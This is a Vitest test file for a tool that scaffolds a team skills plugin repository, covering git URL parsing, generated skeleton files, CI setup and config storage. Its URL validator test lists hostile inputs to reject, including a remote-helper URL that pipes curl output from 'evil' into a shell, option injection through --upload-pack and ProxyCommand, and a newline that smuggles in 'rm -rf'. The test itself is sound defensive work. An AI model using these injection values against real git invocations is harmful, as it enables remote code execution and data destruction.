import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { execFileSync } from "node:child_process";
import { existsSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  assertSafeGitUrl,
  clearTeamConfig,
  formatInitSuccess,
  teamSkillsDir,
  hostFromUrl,
  initTeamRepo,
  loadTeamConfig,
  repoNameFromUrl,
  saveTeamConfig,
  skeletonFiles,
  writeSkeleton,
} from "./init.js";

describe("teamSkillsDir", () => {
  it("is null without a team config and resolves under the marketplaces root with one", () => {
    expect(teamSkillsDir(home, "/plugins/marketplaces")).toBeNull();
    saveTeamConfig({ repoUrl: "git@x:t/skills.git", marketplaceName: "acme-skills" }, home);
    expect(teamSkillsDir(home, "/plugins/marketplaces")).toBe("/plugins/marketplaces/acme-skills/skills");
  });
});

describe("assertSafeGitUrl", () => {
  it("accepts real transports and local paths", () => {
    for (const url of [
      "https://gitlab.example.com/team/skills.git",
      "git@gitlab.example.com:team/skills.git",
      "ssh://git@host/team/skills.git",
      "/var/repos/skills",
      "file:///var/repos/skills",
      "./local-repo",
    ]) {
      expect(() => assertSafeGitUrl(url)).not.toThrow();
    }
  });

  it("rejects remote-helper and option-injection URLs", () => {
    for (const url of [
      'ext::sh -c "curl evil|sh"',
      "fd::17/foo",
      "--upload-pack=/bin/sh",
      "-oProxyCommand=evil",
      "https://host/repo\nrm -rf",
      "",
    ]) {
      expect(() => assertSafeGitUrl(url)).toThrow();
    }
  });
});

let home: string;

beforeEach(() => {
  home = mkdtempSync(join(tmpdir(), "handbook-test-"));
});

afterEach(() => {
  rmSync(home, { recursive: true, force: true });
});

describe("hostFromUrl / repoNameFromUrl", () => {
  it("parses ssh and https git URLs", () => {
    expect(hostFromUrl("git@gitlab.acme.com:team/skills.git")).toBe("gitlab.acme.com");
    expect(hostFromUrl("https://GitHub.com/acme/skills.git")).toBe("github.com");
    expect(repoNameFromUrl("git@gitlab.acme.com:team/skills.git")).toBe("skills");
    expect(repoNameFromUrl("https://github.com/acme/team-skills")).toBe("team-skills");
  });

  it("returns null for unparseable URLs", () => {
    expect(hostFromUrl("")).toBeNull();
    expect(repoNameFromUrl("nonsense")).toBeNull();
  });
});

describe("skeletonFiles", () => {
  it("emits marketplace, plugin, readme, bump script, and skills placeholder", () => {
    const files = skeletonFiles("acme-skills", "git@gitlab.acme.com:team/skills.git", "gitlab.acme.com");
    const marketplace = JSON.parse(files[".claude-plugin/marketplace.json"]!);
    expect(marketplace.name).toBe("acme-skills");
    expect(marketplace.plugins[0]).toMatchObject({ name: "acme-skills", source: "./" });
    const plugin = JSON.parse(files[".claude-plugin/plugin.json"]!);
    expect(plugin).toMatchObject({ name: "acme-skills", version: "0.1.0" });
    expect(files["README.md"]).toContain("/handbook:join git@gitlab.acme.com:team/skills.git");
    expect(files["scripts/bump-version.mjs"]).toContain("plugin.version");
    expect(files["skills/README.md"]).toBeDefined();
    // consumer notice hook ships inside the team plugin (no TeamHandbook engine needed)
    expect(JSON.parse(files["hooks/hooks.json"]!).hooks.SessionStart).toBeDefined();
    expect(files["hooks/notice.mjs"]).toContain("new skill(s) since your last session");
  });

  it("guards the GitLab CI job on the token so it skips instead of failing", () => {
    const gitlab = skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com");
    expect(gitlab[".gitlab-ci.yml"]).toContain("$TEAMHANDBOOK_CI_TOKEN");
  });

  it("documents the CI setup its distribution depends on in the generated README, per host", () => {
    expect(skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com")["README.md"]).toContain(
      "TEAMHANDBOOK_CI_TOKEN",
    );
    expect(skeletonFiles("s", "git@github.com:a/s.git", "github.com")["README.md"]).toContain(
      "Read and write permissions",
    );
  });

  it("discloses the consumer hook's local state write in the generated README", () => {
    expect(skeletonFiles("s", "git@github.com:a/s.git", "github.com")["README.md"]).toContain(
      "~/.teamhandbook-consumer",
    );
  });

  it("picks GitHub Actions for github hosts and GitLab CI otherwise", () => {
    const github = skeletonFiles("s", "git@github.com:a/s.git", "github.com");
    expect(github[".github/workflows/version-bump.yml"]).toBeDefined();
    expect(github[".gitlab-ci.yml"]).toBeUndefined();
    const gitlab = skeletonFiles("s", "git@gitlab.acme.com:a/s.git", "gitlab.acme.com");
    expect(gitlab[".gitlab-ci.yml"]).toBeDefined();
    expect(gitlab[".github/workflows/version-bump.yml"]).toBeUndefined();
    const unknown = skeletonFiles("s", "git@code.acme.com:a/s.git", "code.acme.com");
    expect(unknown[".gitlab-ci.yml"]).toBeDefined();
  });

  it("produces a bump script that actually increments the patch version", () => {
    const dir = mkdtempSync(join(tmpdir(), "handbook-skeleton-"));
    try {
      writeSkeleton(dir, skeletonFiles("s", "git@github.com:a/s.git", "github.com"));
      execFileSync("node", ["scripts/bump-version.mjs"], { cwd: dir });
      const plugin = JSON.parse(readFileSync(join(dir, ".claude-plugin/plugin.json"), "utf8"));
      expect(plugin.version).toBe("0.1.1");
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});

describe("team config", () => {
  it("saves the team section without clobbering other config keys", () => {
    writeFileSync(join(home, "config.json"), JSON.stringify({ gate: { model: "haiku" } }));
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    const config = JSON.parse(readFileSync(join(home, "config.json"), "utf8"));
    expect(config.gate).toEqual({ model: "haiku" });
    expect(loadTeamConfig(home)).toMatchObject({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" });
  });

  it("returns null when no team is configured", () => {
    expect(loadTeamConfig(home)).toBeNull();
  });

  it("clearTeamConfig drops the binding, returns the previous url, and keeps other keys", () => {
    writeFileSync(join(home, "config.json"), JSON.stringify({ gate: { model: "haiku" } }));
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    expect(clearTeamConfig(home)).toBe("git@x.com:a/b.git");
    expect(loadTeamConfig(home)).toBeNull();
    expect(JSON.parse(readFileSync(join(home, "config.json"), "utf8")).gate).toEqual({ model: "haiku" });
    expect(clearTeamConfig(home)).toBeNull(); // idempotent once already gone
  });
});

describe("initTeamRepo", () => {
  function bareRepo(): string {
    const dir = mkdtempSync(join(tmpdir(), "handbook-team-"));
    execFileSync("git", ["init", "--bare", "-b", "main", dir]);
    return dir;
  }

  it("scaffolds, pushes to an empty repo, and records the team config", () => {
    const remote = bareRepo();
    try {
      const result = initTeamRepo(remote, "acme-skills", home, undefined, "2026-08-08T02:00:00Z");
      expect(result).toMatchObject({ ok: true, name: "acme-skills", url: remote });
      const files = execFileSync("git", ["-C", remote, "ls-tree", "-r", "--name-only", "main"], {
        encoding: "utf8",
      });
      expect(files).toContain(".claude-plugin/marketplace.json");
      expect(files).toContain(".claude-plugin/plugin.json");
      expect(files).toContain("scripts/bump-version.mjs");
      expect(loadTeamConfig(home)).toEqual({
        repoUrl: remote,
        marketplaceName: "acme-skills",
        initializedAt: "2026-08-08T02:00:00Z",
      });
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("derives the marketplace name from the repo URL when none is given", () => {
    const result = initTeamRepo("git@gitlab.acme.com:team/Payments-Skills.git", undefined, home, () => {});
    expect(result).toMatchObject({ ok: true, name: "payments-skills" });
  });

  it("fails without touching config when the push is rejected", () => {
    const remote = bareRepo();
    try {
      const seed = mkdtempSync(join(tmpdir(), "handbook-seed-"));
      try {
        execFileSync("git", ["-C", seed, "init", "-b", "main"]);
        writeFileSync(join(seed, "existing.txt"), "occupied");
        execFileSync("git", ["-C", seed, "add", "-A"]);
        execFileSync(
          "git",
          ["-C", seed, "-c", "user.name=t", "-c", "user.email=t@t", "commit", "-m", "seed"],
        );
        execFileSync("git", ["-C", seed, "push", remote, "main"]);
      } finally {
        rmSync(seed, { recursive: true, force: true });
      }
      const result = initTeamRepo(remote, "acme-skills", home);
      expect(result.ok).toBe(false);
      expect(result.error).toContain("git failed");
      expect(loadTeamConfig(home)).toBeNull();
    } finally {
      rmSync(remote, { recursive: true, force: true });
    }
  });

  it("refuses empty URLs, underivable names, and re-initialization", () => {
    expect(initTeamRepo("  ", undefined, home)).toMatchObject({ ok: false });
    expect(initTeamRepo("nonsense", undefined, home, () => {})).toMatchObject({
      ok: false,
      error: expect.stringContaining("--name"),
    });
    saveTeamConfig({ repoUrl: "git@x.com:a/b.git", marketplaceName: "b" }, home);
    expect(initTeamRepo("git@x.com:a/c.git", undefined, home, () => {})).toMatchObject({
      ok: false,
      error: expect.stringContaining("already configured"),
    });
    expect(existsSync(join(home, "sessions"))).toBe(false);
  });
});

describe("formatInitSuccess", () => {
  it("prints the join command and the consumer-only alternative", () => {
    const text = formatInitSuccess({ ok: true, name: "acme-skills", url: "git@x.com:a/b.git", home });
    expect(text).toContain("/handbook:join git@x.com:a/b.git");
    expect(text).toContain("/plugin marketplace add git@x.com:a/b.git");
    expect(text).toContain("/plugin install acme-skills");
  });
});
